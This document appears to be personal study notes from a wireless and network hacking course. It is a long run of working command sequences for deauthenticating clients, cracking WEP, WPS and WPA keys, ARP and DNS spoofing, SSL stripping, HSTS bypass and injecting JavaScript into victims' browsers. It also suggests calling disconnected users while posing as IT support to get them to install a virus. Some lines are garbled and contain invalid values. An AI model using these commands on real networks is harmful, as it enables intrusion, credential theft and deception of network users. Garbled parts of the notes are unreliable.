1. Changing mac address
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:333:444:555
ifconfig wlan0 up
ifconfig

2. To see wireless interface
iwconfig
Wireless Mode always set to managed(Mode:Managed).This allow to capture packets that has a destination mac as of the device 
 Disable Mode from Managed to Monitor
 ifconfig wlan0 down
 iwconfig wlan0 mode monitor
 ifconfig wlan0 up
 iwconfig
This allows the computer to capture any packets within our range,not the ones that are directed to this computer

3. Packet sniffing using Airodump-NG - Part of aircrack-ng suit, 
airodump-ng is a packet sniffer used to capture packets within range and display detailed info about network around us, connected clients

airodump-ng mon0 (this turn airdump in monitor mode mon0 this after setting to monitor mode)
BSSID Shows the mac address of the colu negative,the stronger it is. ie -2 better than -33
Beacons Frames sent by the network to broadcast its existence . Tells all wireless devices that it has this BSSID, using this type of enc, working on channel this
#/s No  packets collected the last ten seconds
CH channel with network works
MB max speed supported by the networkENC encrption use WPA,WPA2
CIPHER cipher used on the network

4. WWiFi Bands
Decides frequency range that can be used,determines channel to be used , clients nedd to support band used by router to communicate with it
Data can be sniffed from certain band id wreless adapter used supports the band
Common Bands 
a 5Ghz frequency only
b,g uses 2.4Ghz only
n uses 5 and 2.4
ac uses frequency lower tha 6Ghz
Dis of 5G  is,not many support monitor mode and packet injection. beeter adapter that use both 2.4 ad 5

airodump-ng --band a mon0 (To monitor 5G network)
airdump-ng --band abg mon0

To sniff specific BSSID, channel and save data capture in file mimi
airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 --write mimi mon0
Use wireshark to analyse the data

5. Deauthentication attack
disconnet any  client from any networkworks on encrypted networks WEP,WPA,WPA2, no need to know network ey,no need to connect to network

airplay-ng deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
How works,pretend to be client that we wnt to diconnet by Changing our MAC address to that one of a client and tell the router i want to disconnect from you
Next we pretend to be the router by changing our MAC to that 
one of Router, and tell the client they are going to be disconneted
Allow to disconect/deauthentica any client from any network 
airplay-ng --deauth 10000 - a F7:23:B4:B9:50:A5 -c 77:23:B4:B9:80: mon0
no of deauth packets to send 100000 use large. It sends this to target and routers,and this diconet target device 
-a mac address target network/router/BSSID
-c give mac address of client to disconne/Station, the device to disconnet 

Most time will fail ,unless you run alonside airodump, *to use write is optional.
 airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 mimi mon0
 airplay-ng --deauth 10000 - a F7:23:B4:B9:50:A5 -c 77:23:B4:B9:80: mon0

 Social engineering - You can disconnet client ,then call user pretend to be it guy telling them install a virus claimimg it will fix the issue, or create fake accss point for them to connect, Capture handshake

 airplay can be used to make other attcks possible

6. Connect without need to conect target network, previous used target connection

  First encrytion
 WEP cracking wired equivalent privacy
 old encryption,use algorthm RC4, used in some network,easy to crack

airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 --write monito mon0
 airplay-ng  monito-01.

 if network is not busy,it will take time to get data; solution force AP to generate new IVs.
 first associate the AP before launching the attack using aireplay-. Associating, does not mean youre connected

Using fake authentication
airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 --write aroto mon0
aireplay-ng --fakeauth 0 -a F7:23:B4:B9:50:A5 -h 44:23:B4:B9:50:A5 mon0

-h mac of wireless adapter device. ifconfig. first 12 digits ,replaces " - " with volons

Using ARP request attack
airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 --write aroto mon0
aireplay-ng --arpreplay -b F7:23:B4:B9:50:A5 - h 44:23:B4:B9:50:A5 mon0

WPA/WPA2
WPS is a feature that can be used with WPA/2
allow device to connect to network   without entering the key , we not hackin WPA/2, Just afeature which iS WPS
method not work if PBC Push Button Authentication is enabled
To find out what type of security is being used : wash --interface mon0   wash is the name of the tool
Lck shows if wps is lock.sometimes lock after failed no of atttempts 

in terminal 2 aireplay-ng --fakeauth 30 -a F7:23:B4:B9:50:A5 -h 44:23:B4:B9:50:A5 mon0 30 time for assosiciation attempt which set after 30 secs
in terminal 1 reaver -bssid F7:23:B4:B9:50:A5  --channel 6 --interface mon0 --vvv --no associate 
vvv ahow information whats happening i.e failed or not
tells reaver not to associate with target network bcoz we are manually doing, better to manualy with terminal 2

WPA/2 FIxed all weakness in WEP
packets sends do not conain any useful data, packet which can aid with the cracking are HANDSHAKE packets.
thes sre 4 packets sent when a client connect to the network

airdump-ng --bssid F7:23:B4:B9:50:A5 --channel 2 --write aroto_hanshake mon0
airplay-ng --deauth 4 - a F7:23:B4:B9:50:A5 -c 77:23:B4:B9:80: mon0
-c give mac address of client to disconnet
Handshake doesnot contain data that can help get WPA key, contains data that can be used to check if a key is valid or not
Use wordlist to check the pasword

8. Creating wordlist using a toolcalled crunck  ..for help type man crunch
 syntax
 Crunck[min][max][characters]-t[patttern]-o[filename]
 -t s optional to give it a pattern. ie you saw the password start with a
 i.e  crunch 6 8 123abc$ -o wordlist -t a@@@@b here one suggested the password start with an a

for  WPA crack you need 4 way handshake,and wordlist
aircrack ng is going to unpack the handshake and extract useful info
MIC message intergrity code used by access point to verify if password is correct or not. ie one generated is same as the one in hanshake, move to all wordlist password  and compare one in the handshake

aircrack-ng wpa_hanshake-01.cap -w mywordlist.txt

ip route.show / manipulate routing, devices, policy routing and tunnels

9. Post connection attacks
gather info
intrcept data(username,passwords)
modify data on the fly

Discover all devices and display ip address,mac address,OS,open ports etc. We use  netdiscover and Nmap

netdiscover -r 196.168.100.1/24
-r show ip range to discover/search
netdiscover -r 196.168.100.1/24 this means search from 196.168.100.1 to 196.168.100.255. This specify ip range of all subnet

netdiscover also discover client discover same client network

NMap slower but has mor information well use zenmap which is a graphical intrerface using zenmap


Spoofing USING ARP (Address Resolution Protocol)
simple protocol used to ma ip addresss of a machine to its MAC address

Tool 1 ARP spoof
check gate way arp -a
check interface of target using also arp -a (window)
syntax arpspoof -i [interface] -t [clientIp] [gatewayIP]
arpspoof -i [interface] -t [gatewayIP] [clientIp]

After this, you need to enable port forwading since the laptop is not a router, this allow packets flow just like a routter

echo 1 > /proc/sys/net/ipv4/ip_forward

Tool 2 Bettercap
used to ARP spoof targets,sniff data(passwords,urls),bypass https, redirect domain,inject code etc

syntax bettercap -iface [interface]

bettercap -iface wlan0
to get help type help
under modeules you can select any module also to get help. ie: help gps, help net.probe
net.shaw= will show all devices connected to the same network

using set you can change any option in any module.
To spoof target,set
 set arp.spoof.fullduplex true
 set arp.spoot.targets IP1,ip2
 i.e set arp.spoot.targets 192.168.100.2

net.sniff for sniffing
net.sniff on
 Capture data send and received via in IP 192.168.100.2 and analyse it 

 to read command from a file we use caplet string (bettercap --help)
 we create a script with all command in order which they will be executed and save it in rooot
i.e commands 
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.111.111.2
arp.spoof on
net.sniff on

111. bettercap -iface wlan0 -caplet lazy.cap
 This gets http .son Downgrade
  To be able to bypass https, we give them HTTP one

  Tool to downgrade = use SSL Strip 

By pass HTTPS
chech diferent caplets  caplets.show

  bettercap comes with many caplets using caplets.show
  we will use hstshijack bybass caplet. 
  To run any caplet,type the name i.e hstshijack/hstshijack

  hence will be
  bettercap -iface wlan0 -caplet lazy.cap
  
  hstshijack/hstshijack

SSL Striping attack

Bypassing HSTS
HSTS stands for HTTP Strict Transport Security. It is a web security policy mechanism that helps to protect websites against man-in-the-middle attacks such as protocol downgrade attacks and cookie hijacking. HSTS allows a web server to declare that it should only be accessed using secure, encrypted connections, and helps ensure that users' browsers interact with the website over HTTPS (HTTP Secure) rather than HTTP (unencrypted).
Modern browsers are hard-coded to only load list of HSTS website over https. When a website is HSTS-enabled, the web server sends a Strict-Transport-Security HTTP header to the user's browser. 

soln
trick the browser into loading diff website
- replace all links for HSTS website with similar link.i.e twitter.co with twiter.com
  
  targets are domains that use HSTS and you want to replace 
  * ia  a wilcard and says any subdomain .facebook.com is a target

[/usr/share/bettercap/caplets/hstshijack]
└─$ gedit hstshijack.cap  
set targets and choose replacement
obsfuscate false .some browser block  when is true

method 1
bettercap -iface wlan0 -caplet lazy.cap
hstshijack/hstshijack

method 2
 help
 set http .proxy.sslstrip true
 net.probe on
 net.sniff on
 arp.spoof on
 hstshijack/hstshijack

DNS Spoofing.
When someone request google.com, we take them to yahoo.
In our case I take them to apache2 webserver 

service apache2 start  
ifconfig
take the ip address which is 172.17.0.1
found in var/www/html

help dns.spoof, 
will show spoof address,if to spoff all, domains to spoof and host. Here it will use our default IP as spoof adress
 set dns.spoof.all true
set dns.spoof.domains zsecurity.org,*.zsecurity.org  Here we spoof two website
* mean will target any subdomain  .zsecurity.org
dns.spoof on

bettercap -iface wlan0 -caplet lazy.cap
set dns.spoof.all true
set dns.spoof.domains zsecurity.org,*.zsecurity.org
dns.spoof on

  Code injection
  Inject javascript code in loaded [pages
  code gets executed by target browser
  can be used to, replace links,repplace images,inser html elements,hook target browser to exploitation frameworks]


add javascript file in payload in hstshijack.cap
i.e ,*/root/javer.js  if you want specific domain do not use *

then continue
bettercap -iface wlan0 -caplet lazy.cap
hstshijack/hstshijack

web bettercap
bettercap -iface wlan0
http-ui 
username is user
password pass

Wireshark(Not a hacking tool) Capture things on your interface, not the target interface
Network protocol analyser.Help to track whats happening in the network. used by network admin
How it works
Logs, Packets that flow through the selected interface
Analyse all the packets
Can be used to sniff & analyse traffic send and received by targets

set net.sniff.output /root/capturedetail.cap   adding this to lazy .This location where things are store capture from betercap.

You can take that file then analyse using wireshark

ARP allow to be Man in the middle,Bettercap,Fake access pointt Honey pot(uses wireless dvice)

XArp used to automatically check if ARP Poisoning attack has been done.also wireshark can be used

Metasploit commands
msfconsole - runs metasploit
help - show help
sho[something] - something can be exploits,payloads,auxilaries or options
use[something]
set[option][value] - configure[option] to have a avlue of [value] ie set ip address of target. set ip set value of IP
exploit - runs the current task